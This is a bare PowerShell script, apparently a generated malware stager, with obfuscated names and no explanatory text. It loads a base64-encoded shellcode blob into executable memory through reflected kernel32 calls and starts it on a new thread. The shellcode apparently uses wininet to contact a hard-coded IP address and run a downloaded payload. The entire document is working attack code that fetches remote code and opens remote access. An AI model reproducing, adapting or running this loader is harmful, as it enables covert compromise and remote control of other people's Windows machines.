function phzNM {
	Param ($s_s, $xl5)		
	$pDbx = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $pDbx.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pDbx.GetMethod('GetModuleHandle')).Invoke($null, @($s_s)))), $xl5))
}

function jNLJ {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $x8,
		[Parameter(Position = 1)] [Type] $oM = [Void]
	)
	
	$sOas = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$sOas.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $x8).SetImplementationFlags('Runtime, Managed')
	$sOas.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $oM, $x8).SetImplementationFlags('Runtime, Managed')
	
	return $sOas.CreateType()
}

[Byte[]]$quMl = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1obmV0AGh3aW5pVGhMdyYH/9Ux21NTU1NTaDpWeaf/1VNTagNTU2gCBAAA6HUBAAAvejZiVV94enVLVTlxbFd1VU1FVElHZzREYTNoaFNLV3RNMWJURmV4c3lCdUNuZ1g4TUhDeWloVTJCOGV3R0xramM0cklMNDBUNFJVWTVTWlBwejJGQkx4Wm8zV0V3NE1DZHowTXNjYUdVUDVJNHpSdDNQeERROUlOQ3htb1FQVmxndGZLNjNJOTlFUDlBcEtkYzNDN1lNc0pqbmZ0MW5ZYjZpSWE0LWNVdWt5ZDdpQ2RMeHZ6OXdnWXZVTE5Zd1RFaUxRa2NWb3U0MHNfSXdHQTA0Nm5ZbWxaclhRZE5GM1REQ1Z3STdPNndyRy1DU1V0alNhNGFSa3gAUGhXiZ/G/9WJxlNoAAJghFNTU1dTVmjrVS47/9WWagpfU1NTU1ZoLQYYe//VhcB1FGiIEwAAaETwNeD/1U914ehLAAAAakBoABAAAGgAAEAAU2hYpFPl/9WTU1OJ51doACAAAFNWaBKWieL/1YXAdM+LBwHDhcB15VjDX+h/////NzEuMTkzLjE1OS4yNDQAu/C1olZqAFP/1Q==")
		
$iC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((phzNM kernel32.dll VirtualAlloc), (jNLJ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $quMl.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($quMl, 0, $iC, $quMl.length)

$sx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((phzNM kernel32.dll CreateThread), (jNLJ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$iC,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((phzNM kernel32.dll WaitForSingleObject), (jNLJ @([IntPtr], [Int32]))).Invoke($sx,0xffffffff) | Out-Null